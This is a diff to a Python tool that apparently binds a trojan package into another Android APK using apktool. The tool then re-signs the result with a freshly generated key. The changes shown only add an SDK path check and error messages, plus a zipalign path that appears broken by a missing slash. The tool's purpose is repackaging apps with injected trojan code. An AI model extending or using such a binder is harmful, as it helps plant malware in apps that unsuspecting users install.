@@ -10,6 +10,9 @@ import sys
 import glob
 
 apktool = "/home/hoodlums/apktool/apktool"
+androidSdk= os.path.expanduser('~') + "/Android/Sdk"
+
+
 TempDirectory = '/tmp/MixApk/'
 
 packageToInject = 'trojan.android.android_trojan.action'
@@ -177,7 +180,10 @@ if not os.path.exists(TempDirectory):
 args = ParseArgs().getargs()
 
 if not os.path.isfile(apktool):
-    error("apktool isn't install", None, 1)
+    error("apktool isn't install in" + apktool, None, 1)
+
+if not os.path.exists(androidSdk):
+    error("android SDK isn't install in" + androidSdk, None, 1)
 
 if args.apks and os.path.isfile(args.apks[0]) and os.path.isfile(args.apks[1]):
     try:
@@ -235,7 +241,7 @@ try:
 
     shutil.copyfile(apk2DistApk, apk2Dist + 'app-debug.apk')
 
-    call('~/android/sdk/build-tools/21.1.1/zipalign -v 4 app-debug.apk app-debug2.apk', shell=True)
+    call('~/android/sdk/build-tools21.1.1/zipalign -v 4 app-debug.apk app-debug2.apk', shell=True)
     call('keytool -genkey -v -keystore ~/.android/debug.keystore -alias sample -keyalg RSA -keysize 2048 -validity 20000', shell=True)
     call('jarsigner -verbose -keystore ~/.android/debug.keystore app-debug2.apk sample', shell=True)
     call('jarsigner -verify app-debug2.apk', shell=True)
